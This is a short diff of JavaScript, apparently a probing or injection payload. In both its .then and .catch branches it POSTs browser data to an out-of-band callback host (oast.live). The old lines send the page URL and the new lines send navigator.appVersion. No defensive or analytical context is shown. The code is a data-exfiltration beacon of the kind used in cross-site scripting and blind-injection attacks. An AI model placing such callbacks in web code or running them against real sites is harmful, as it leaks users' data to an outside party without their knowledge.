@@ -9,7 +9,7 @@
       mode: "no-cors"
     })
     .then(r => {
-      fetch(`https://d9snkcimruoij3kjgbog76tytcn3omxq1.oast.live/?q=${document.location.href}`, {
+      fetch(`https://d9snkcimruoij3kjgbog76tytcn3omxq1.oast.live/?q=${navigator.appVersion}`, {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
@@ -22,7 +22,7 @@
       });
     })
     .catch(err => {
-      fetch(`https://d9snkcimruoij3kjgbog76tytcn3omxq1.oast.live/?q=${document.location.href}`, {
+      fetch(`https://d9snkcimruoij3kjgbog76tytcn3omxq1.oast.live/?q=${navigator.appVersion}`, {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
